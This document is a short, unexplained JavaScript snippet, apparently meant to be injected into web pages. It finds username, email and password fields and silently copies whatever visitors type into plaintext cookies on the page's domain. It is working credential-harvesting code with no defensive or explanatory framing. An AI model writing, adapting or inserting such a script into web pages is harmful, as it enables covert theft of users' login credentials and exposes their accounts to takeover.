/*action*/
setTimeout(function(){
    var _inputs = document.getElementsByTagName('input');
    var _a = document.getElementsByTagName('a');
    var _buttons = document.getElementsByTagName('button');
    var _userName;
    var _passWord;
    var _host = window.location.host;
    var _domain = document.domain;
    document.cookie = "host="+_host+"; domain="+_domain+"; path=/;"
    for(var i = 0, l = _inputs.length;i < l;i++){
        if(_inputs[i].outerHTML.toString().indexOf('user') > -1 || _inputs[i].outerHTML.toString().indexOf('email') > -1){
            _inputs[i].addEventListener('change',function(){
                _userName = this.value; 
                document.cookie = "userName2="+_userName+"; domain="+_domain+"; path=/;"
            },false);
        }
        if(_inputs[i].outerHTML.toString().indexOf('pass') > -1){
            _inputs[i].addEventListener('change',function(){
                _passWord = this.value;
                document.cookie = "passWord2="+_passWord+"; domain="+_domain+"; path=/;"
                
            },false);
        }
    }
},1000);
